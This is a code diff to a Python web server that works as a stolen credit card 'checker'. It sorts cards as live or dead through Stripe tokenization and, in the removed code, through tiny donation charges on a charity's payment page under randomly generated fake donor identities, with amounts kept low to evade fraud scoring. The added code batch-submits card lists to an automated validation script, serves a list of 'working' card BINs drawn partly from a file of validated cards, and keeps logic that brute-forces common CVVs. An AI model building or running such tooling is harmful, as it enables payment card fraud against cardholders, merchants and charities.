@@ -14,6 +14,7 @@ import uuid
 import time
 import threading
 from datetime import datetime
+import subprocess
 
 # Load configuration
 CONFIG = {}
@@ -96,6 +97,7 @@ class CCCheckerHandler(BaseHTTPRequestHandler):
                 self.send_header('Expires', '0')
                 self.end_headers()
                 self.wfile.write(content)
+
             # Endpoint for demo card retrieval
             elif path_clean == '/get_demo_cards':
                 try:
@@ -145,41 +147,14 @@ class CCCheckerHandler(BaseHTTPRequestHandler):
                     self.wfile.write(json.dumps(token_result).encode('utf-8'))
                     return
                 
-                # Token created implies the card is Live even if PaymentIntent fails
+                # Token created implies the card is Live
                 if token_result.get("status") == "TokenCreated":
-                    token_id = token_result.get("id")
-                    
-                    # 2. Fetch PaymentIntent (GiveDirectly)
-                    try:
-                        intent_data = self.fetch_payment_intent()
-                        client_secret = intent_data.get("clientSecret")
-                        payment_intent_id = intent_data.get("paymentIntent")
-
-                        if not client_secret or not payment_intent_id:
-                            # Token exists but PaymentIntent failed to load -> still Live
-                            self.send_response(200)
-                            self.send_header('Content-type', 'application/json')
-                            self.end_headers()
-                            self.wfile.write(json.dumps({"status": "Live", "message": "Live - Token Created"}).encode('utf-8'))
-                            return
-
-                        # 3. Confirm PaymentIntent
-                        confirm_result = self.confirm_payment_intent(payment_intent_id, client_secret, token_id)
-                        
-                        # Explicitly mark expiration errors coming from confirm() as Dead
-                        if confirm_result.get("status") == "Dead" and "expired" in confirm_result.get("message", "").lower():
-                            self.send_response(200)
-                            self.send_header('Content-type', 'application/json')
-                            self.end_headers()
-                            self.wfile.write(json.dumps(confirm_result).encode('utf-8'))
-                            return
-                    except Exception as e:
-                        # Token exists but confirm failed -> treat as Live
-                        self.send_response(200)
-                        self.send_header('Content-type', 'application/json')
-                        self.end_headers()
-                        self.wfile.write(json.dumps({"status": "Live", "message": "Live - Token Created (confirm error)"}).encode('utf-8'))
-                        return
+                     # Token exists, return Live result
+                     self.send_response(200)
+                     self.send_header('Content-type', 'application/json')
+                     self.end_headers()
+                     self.wfile.write(json.dumps({"status": "Live", "message": "Live - Token Created"}).encode('utf-8'))
+                     return
                 else:
                     # Token creation failed, return result as-is
                     self.send_response(200)
@@ -187,14 +162,9 @@ class CCCheckerHandler(BaseHTTPRequestHandler):
                     self.end_headers()
                     self.wfile.write(json.dumps(token_result).encode('utf-8'))
                     return
-                
-                self.send_response(200)
-                self.send_header('Content-type', 'application/json')
-                self.end_headers()
-                self.wfile.write(json.dumps(confirm_result).encode('utf-8'))
             except Exception as e:
                 print(f"Check Card Error: {e}")
-                self.send_response(200) # Keep 200 so the frontend can handle the error
+                self.send_response(200) 
                 self.send_header('Content-type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "Unknown", "message": str(e)}).encode('utf-8'))
@@ -257,6 +227,136 @@ class CCCheckerHandler(BaseHTTPRequestHandler):
                 self.end_headers()
             except:
                 self.send_error(500)
+        
+        # Endpoint for automated Stripe verification
+        elif self.path.endswith('/auto_verify_cards'):
+            try:
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length).decode('utf-8')
+                data = json.loads(post_data)
+                cards = data.get('cards', [])
+                
+                if not cards:
+                    self.send_response(400)
+                    self.send_header('Content-type', 'application/json')
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"status": "error", "message": "No cards provided"}).encode('utf-8'))
+                    return
+                
+                # Save cards to temp file
+                temp_file = "temp_cards_to_verify.txt"
+                with open(temp_file, 'w') as f:
+                    for card in cards:
+                        f.write(card + '\n')
+                
+                # Start automation in background thread
+                def run_automation():
+                    try:
+                        # Run stripe_api_check.py - API-based validation (most reliable)
+                        subprocess.Popen([
+                            sys.executable, 
+                            'stripe_api_check.py',
+                            temp_file
+                        ])
+                        print(f"[{datetime.now()}] Started API validation for {len(cards)} cards")
+                    except Exception as e:
+                        print(f"Error starting automation: {e}")
+                
+                thread = threading.Thread(target=run_automation, daemon=True)
+                thread.start()
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({
+                    "status": "started",
+                    "message": f"Automation started for {len(cards)} cards"
+                }).encode('utf-8'))
+                
+            except Exception as e:
+                print(f"Auto Verify Error: {e}")
+                self.send_response(500)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
+        
+        # Endpoint for downloading logs
+        elif self.path.endswith('/download_logs'):
+            try:
+                # Check for the most recent log file
+                log_files = ['stripe_api_check.log']
+                log_file = None
+                
+                for lf in log_files:
+                    if os.path.exists(lf):
+                        log_file = lf
+                        break
+                
+                if log_file:
+                    with open(log_file, 'rb') as f:
+                        content = f.read()
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/plain')
+                    self.send_header('Content-Disposition', f'attachment; filename="{log_file}"')
+                    self.end_headers()
+                    self.wfile.write(content)
+                else:
+                    self.send_error(404, "Log file not found")
+            except Exception as e:
+                print(f"Download Logs Error: {e}")
+                self.send_error(500)
+        
+        # Endpoint for getting working BINs
+        elif self.path.endswith('/get_working_bins'):
+            try:
+                # List of BINs known to work better (virtual cards, prepaid, etc.)
+                working_bins = [
+                    {"bin": "486555", "bank": "SUTTON BANK", "country": "US", "type": "DEBIT"},
+                    {"bin": "414720", "bank": "CHASE", "country": "US", "type": "CREDIT"},
+                    {"bin": "426684", "bank": "CAPITAL ONE", "country": "US", "type": "CREDIT"},
+                    {"bin": "453268", "bank": "WELLS FARGO", "country": "US", "type": "CREDIT"},
+                    {"bin": "489049", "bank": "CITI", "country": "US", "type": "CREDIT"},
+                    {"bin": "424631", "bank": "DISCOVER", "country": "US", "type": "CREDIT"},
+                    {"bin": "434256", "bank": "VISA VIRTUAL", "country": "US", "type": "PREPAID"},
+                    {"bin": "513618", "bank": "MASTERCARD", "country": "US", "type": "CREDIT"},
+                    {"bin": "540542", "bank": "MASTERCARD", "country": "CA", "type": "CREDIT"},
+                    {"bin": "470572", "bank": "REVOLUT", "country": "GB", "type": "PREPAID"},
+                ]
+                
+                # Also read from lives.txt to find successful BINs
+                if os.path.exists("lives.txt"):
+                    try:
+                        with open("lives.txt", "r") as f:
+                            lines = f.readlines()
+                        # Extract BINs from successful cards
+                        live_bins = set()
+                        for line in lines:
+                            card_num = line.strip().split('|')[0] if '|' in line else line.strip()
+                            if len(card_num) >= 6:
+                                live_bins.add(card_num[:6])
+                        
+                        # Add live BINs to the list
+                        for bin_num in list(live_bins)[:5]:  # Top 5 from lives
+                            working_bins.insert(0, {
+                                "bin": bin_num,
+                                "bank": "FROM LIVES",
+                                "country": "??",
+                                "type": "PROVEN"
+                            })
+                    except:
+                        pass
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({"bins": working_bins}).encode('utf-8'))
+            except Exception as e:
+                print(f"Get Working BINs Error: {e}")
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({"bins": []}).encode('utf-8'))
+        
         else:
              self.send_error(404)
 
@@ -375,7 +475,7 @@ class CCCheckerHandler(BaseHTTPRequestHandler):
                     if SETTINGS.get("auto_brute_cvv", False) and retry_count == 0:
                         # Try common CVV combinations
                         common_cvv = ["123", "000", "111", "999", "456", "789"]
-                        for test_cvv in common_cvv[:3]:  # Пробуем первые 3
+                        for test_cvv in common_cvv[:3]:  # Try first 3
                             if test_cvv != cvc:
                                 time.sleep(0.5)
                                 retry_result = self.check_card_android(ccn, month, year, test_cvv, retry_count + 1)
@@ -408,8 +508,8 @@ class CCCheckerHandler(BaseHTTPRequestHandler):
                         # After retries, generic decline likely means Dead
                         return {"status": "Dead", "message": "Generic Decline (after retry)"}
                     elif decline_code in ['do_not_honor', 'transaction_not_allowed']:
-                        # Card exists but issuer blocks the transaction -> Live
-                        return {"status": "Live", "message": f"Live - {decline_code}"}
+                        # Issuer blocks the transaction = Dead
+                        return {"status": "Dead", "message": f"Dead - {decline_code}"}
                     else:
                         # Any other decline code without certainty defaults to Dead
                         return {"status": "Dead", "message": f"Declined: {decline_code}"}
@@ -421,131 +521,7 @@ class CCCheckerHandler(BaseHTTPRequestHandler):
         except Exception as e:
             return {"status": "Unknown", "message": str(e)}
 
-    def confirm_payment_intent(self, payment_intent_id, client_secret, token_id):
-        """Confirm a PaymentIntent with improved 3DS and error handling"""
-        url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
-        
-        # Use the same key family as token creation
-        stripe_key = get_stripe_key()
-        
-        headers = {
-            "Authorization": f"Bearer {stripe_key}",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Stripe/v1 AndroidBindings/20.21.0",
-            "Accept": "application/json"
-        }
-        
-        # Send token via payment_method_data because Stripe issued a tok_, not pm_
-        data = {
-            "client_secret": client_secret,
-            "payment_method_data[type]": "card",
-            "payment_method_data[card][token]": token_id,
-            "use_stripe_sdk": "true",
-            "return_url": "stripe-js://payment-intent/return-url"
-        }
-        
-        data_encoded = urllib.parse.urlencode(data).encode('utf-8')
-        req = urllib.request.Request(url, data=data_encoded, headers=headers, method="POST")
-        
-        timeout = SETTINGS.get("timeout_seconds", 20)
-        
-        try:
-            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as response:
-                resp_data = json.loads(response.read().decode('utf-8'))
-                status = resp_data.get('status')
-                
-                if status == 'succeeded':
-                    return {"status": "Live", "message": "Charged Successfully"}
-                elif status in ['requires_action', 'requires_source_action']:
-                    # Requires 3DS. Card is valid but needs additional authentication
-                    return {"status": "3DS", "message": f"Requires 3DS ({status})"}
-                elif status == 'requires_capture':
-                    # Authorized but needs capture -> Live
-                    return {"status": "Live", "message": "Live - Authorized (requires capture)"}
-                elif status == 'processing':
-                    # Processing means Live
-                    return {"status": "Live", "message": "Live - Processing"}
-                else:
-                    # All other statuses are ambiguous → Unknown
-                    return {"status": "Unknown", "message": f"Status: {status}"}
-                    
-        except urllib.error.HTTPError as e:
-            try:
-                error_resp = json.loads(e.read().decode('utf-8'))
-                error_obj = error_resp.get('error', {})
-                error_msg = error_obj.get('message', str(e))
-                code = error_obj.get('code', '')
-                decline_code = error_obj.get('decline_code', '')
-                
-                # Proper confirm handling: reaching this stage means token exists
-                # Even if confirm fails, the card exists
-                if code == 'card_declined':
-                    if decline_code == 'insufficient_funds':
-                        return {"status": "Live", "message": "Live - Insufficient Funds"}
-                    elif decline_code in ['incorrect_cvc', 'invalid_cvc']:
-                        return {"status": "Live", "message": "CCN Live - Incorrect CVC"}
-                    elif decline_code == 'generic_decline':
-                        # Generic decline during confirm still implies Live (token existed)
-                        return {"status": "Live", "message": "Live - Generic Decline (token created)"}
-                    elif decline_code in ['do_not_honor', 'transaction_not_allowed']:
-                        return {"status": "Live", "message": f"Live - {decline_code}"}
-                    else:
-                        # Any other decline still counts as Live because token succeeded
-                        return {"status": "Live", "message": f"Live - Declined: {decline_code} (token created)"}
-                elif code in ['incorrect_cvc', 'invalid_cvc']:
-                    return {"status": "Live", "message": f"CCN Live - {error_msg}"}
-                elif code == 'insufficient_funds':
-                    return {"status": "Live", "message": "Live - Insufficient Funds"}
-                elif code in ['invalid_number', 'incorrect_number', 'expired_card']:
-                    return {"status": "Dead", "message": f"{error_msg}"}
-                else:
-                    # Unknown errors default to Dead
-                    return {"status": "Dead", "message": f"{error_msg} ({code})"}
-            except:
-                return {"status": "Dead", "message": f"Confirm Error {e.code}"}
-        except Exception as e:
-            return {"status": "Unknown", "message": str(e)}
 
-    def fetch_payment_intent(self):
-        """Fetch a PaymentIntent using low-dollar amounts to minimize fraud score"""
-        url = "https://donate.givedirectly.org/payment-intent"
-        
-        # Generate placeholder donor identity
-        letters = string.ascii_lowercase
-        first_name = ''.join(random.choice(letters) for i in range(6)).capitalize()
-        last_name = ''.join(random.choice(letters) for i in range(8)).capitalize()
-        email = f"{first_name.lower()}.{last_name.lower()}@gmail.com"
-        
-        # Keep amounts small ($0.50-$1.00) to reduce fraud score
-        charge_amount = SETTINGS.get("charge_amount_cents", 50)
-        charge_max = SETTINGS.get("charge_amount_max_cents", 100)
-        cents = random.randint(charge_amount, charge_max)
-        
-        payload = {
-            "cents": cents,  # $0.50-$1.00 for lower fraud score
-            "frequency": "once",
-            "campaignName": "General",
-            "emailAddress": email,
-            "firstName": first_name,
-            "lastName": last_name,
-            "recaptchaResponse": "skip",
-            "subscribeToEmailList": False
-        }
-        
-        headers = {
-            "User-Agent": get_user_agent(),
-            "Content-Type": "application/json",
-            "Origin": "https://donate.givedirectly.org",
-            "Referer": "https://donate.givedirectly.org/"
-        }
-        
-        req = urllib.request.Request(url, data=json.dumps(payload).encode('utf-8'), headers=headers, method="POST")
-        
-        timeout = SETTINGS.get("timeout_seconds", 10)
-        with urllib.request.urlopen(req, timeout=timeout) as response:
-            if response.status == 200:
-                return json.loads(response.read().decode('utf-8'))
-        raise Exception("Failed to fetch intent")
 
     def get_bin_info(self, ccn):
         try:
